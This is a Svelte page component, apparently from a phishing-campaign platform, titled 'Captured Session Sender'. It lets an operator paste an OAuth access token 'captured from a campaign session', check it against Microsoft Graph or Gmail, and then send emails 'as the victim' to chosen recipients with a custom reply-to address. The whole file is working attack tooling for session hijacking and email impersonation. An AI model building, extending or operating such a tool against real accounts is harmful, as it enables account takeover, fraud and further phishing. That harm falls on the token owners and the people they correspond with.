<script>
	import { onMount } from 'svelte';
	import { api } from '$lib/api/apiProxy.js';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import Headline from '$lib/components/Headline.svelte';
	import { hideIsLoading, showIsLoading } from '$lib/store/loading';
	import { addToast } from '$lib/store/toast';

	let providers = [];
	let selectedProvider = 'microsoft';
	let accessToken = '';
	let validationResult = null;
	let validating = false;
	let isLoaded = false;

	let sendForm = {
		accessToken: '',
		provider: 'microsoft',
		to: '',
		subject: '',
		body: '',
		bodyType: 'html',
		cc: '',
		bcc: '',
		replyTo: ''
	};

	let sending = false;
	let sendResult = null;

	onMount(async () => {
		showIsLoading();
		try {
			const res = await api.capturedSession.getProviders();
			if (res && res.data) {
				providers = res.data;
			}
		} catch (e) {
			// defaults are fine
		}
		isLoaded = true;
		hideIsLoading();
	});

	async function validateToken() {
		validating = true;
		validationResult = null;
		try {
			const res = await api.capturedSession.validate(accessToken, selectedProvider);
			if (res && res.data) {
				validationResult = res.data;
				sendForm.accessToken = accessToken;
				sendForm.provider = selectedProvider;
				addToast('Token validated - Sender: ' + (validationResult.email || validationResult.displayName || 'Unknown'), 'Success');
			}
		} catch (e) {
			addToast('Token validation failed: ' + (e.message || 'Invalid or expired token'), 'Error');
		}
		validating = false;
	}

	async function sendEmail() {
		sending = true;
		sendResult = null;
		try {
			const res = await api.capturedSession.send(sendForm);
			if (res && res.data) {
				sendResult = res.data;
				addToast('Email sent successfully as captured session', 'Success');
			}
		} catch (e) {
			addToast('Send failed: ' + (e.message || 'Unknown error'), 'Error');
		}
		sending = false;
	}
</script>

<HeadTitle title="Captured Session Sender" />

{#if isLoaded}
	<Headline title="Captured Session Sender" subtitle="Send emails as the victim using captured OAuth access tokens from campaign sessions." />

	<!-- Step 1: Validate Token -->
	<div class="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-none border border-gray-200 dark:border-gray-700 p-6 mb-6 mt-6 transition-colors duration-200">
		<h2 class="text-lg font-semibold text-gray-700 dark:text-gray-200 mb-4">Step 1: Validate Captured Token</h2>
		<p class="text-sm text-gray-500 dark:text-gray-400 mb-4">
			Paste the OAuth access token captured from a campaign session. This will verify the token
			is still valid and retrieve the sender identity.
		</p>

		<div class="space-y-4">
			<div>
				<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Provider</label>
				<select bind:value={selectedProvider} class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm">
					{#each providers as provider}
						<option value={provider.id}>{provider.name}</option>
					{:else}
						<option value="microsoft">Microsoft Graph API</option>
						<option value="google">Google Gmail API</option>
					{/each}
				</select>
			</div>

			<div>
				<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Access Token</label>
				<textarea bind:value={accessToken} rows="4"
					class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm font-mono text-xs"
					placeholder="Paste the captured OAuth access token here..."></textarea>
			</div>

			<button on:click={validateToken} disabled={validating || !accessToken}
				class="bg-cta-blue px-4 py-2 text-white rounded-md font-semibold hover:opacity-80 text-sm transition-all duration-200 disabled:opacity-50">
				{validating ? 'Validating...' : 'Validate Token'}
			</button>
		</div>

		{#if validationResult}
			<div class="mt-4 p-4 bg-green-50 dark:bg-green-900/20 rounded border border-green-200 dark:border-green-800">
				<h3 class="font-medium text-green-800 dark:text-green-300 mb-2">Token Valid</h3>
				<div class="grid grid-cols-2 gap-2 text-sm">
					{#if validationResult.email}
						<div class="text-gray-700 dark:text-gray-300"><span class="font-medium">Email:</span> {validationResult.email}</div>
					{/if}
					{#if validationResult.displayName}
						<div class="text-gray-700 dark:text-gray-300"><span class="font-medium">Name:</span> {validationResult.displayName}</div>
					{/if}
					{#if validationResult.provider}
						<div class="text-gray-700 dark:text-gray-300"><span class="font-medium">Provider:</span> {validationResult.provider}</div>
					{/if}
					{#if validationResult.scopes}
						<div class="col-span-2 text-gray-700 dark:text-gray-300"><span class="font-medium">Scopes:</span> {validationResult.scopes}</div>
					{/if}
				</div>
			</div>
		{/if}
	</div>

	<!-- Step 2: Compose and Send -->
	<div class="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-none border border-gray-200 dark:border-gray-700 p-6 transition-colors duration-200">
		<h2 class="text-lg font-semibold text-gray-700 dark:text-gray-200 mb-4">Step 2: Compose and Send</h2>

		<div class="space-y-4">
			<div class="grid grid-cols-2 gap-4">
				<div class="col-span-2">
					<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">To (comma-separated)</label>
					<input type="text" bind:value={sendForm.to}
						class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm"
						placeholder="victim@example.com, target@example.com" />
				</div>
				<div>
					<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">CC</label>
					<input type="text" bind:value={sendForm.cc}
						class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm" placeholder="Optional" />
				</div>
				<div>
					<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">BCC</label>
					<input type="text" bind:value={sendForm.bcc}
						class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm" placeholder="Optional" />
				</div>
			</div>

			<div>
				<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Subject</label>
				<input type="text" bind:value={sendForm.subject}
					class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm"
					placeholder="Email subject..." />
			</div>

			<div>
				<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Reply-To (optional)</label>
				<input type="text" bind:value={sendForm.replyTo}
					class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm"
					placeholder="reply@example.com" />
			</div>

			<div>
				<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Body Type</label>
				<select bind:value={sendForm.bodyType} class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm">
					<option value="html">HTML</option>
					<option value="text">Plain Text</option>
				</select>
			</div>

			<div>
				<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Body</label>
				<textarea bind:value={sendForm.body} rows="10"
					class="w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm font-mono text-sm"
					placeholder="Email body content..."></textarea>
			</div>

			<button on:click={sendEmail} disabled={sending || !sendForm.to || !sendForm.subject || !sendForm.accessToken}
				class="bg-red-600 px-4 py-2 text-white rounded-md font-semibold hover:bg-red-700 text-sm transition-all duration-200 disabled:opacity-50">
				{sending ? 'Sending...' : 'Send as Captured Session'}
			</button>
		</div>

		{#if sendResult}
			<div class="mt-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded border border-blue-200 dark:border-blue-800">
				<h3 class="font-medium text-blue-800 dark:text-blue-300 mb-2">Send Result</h3>
				<pre class="text-xs font-mono overflow-auto text-gray-700 dark:text-gray-300">{JSON.stringify(sendResult, null, 2)}</pre>
			</div>
		{/if}
	</div>
{/if}
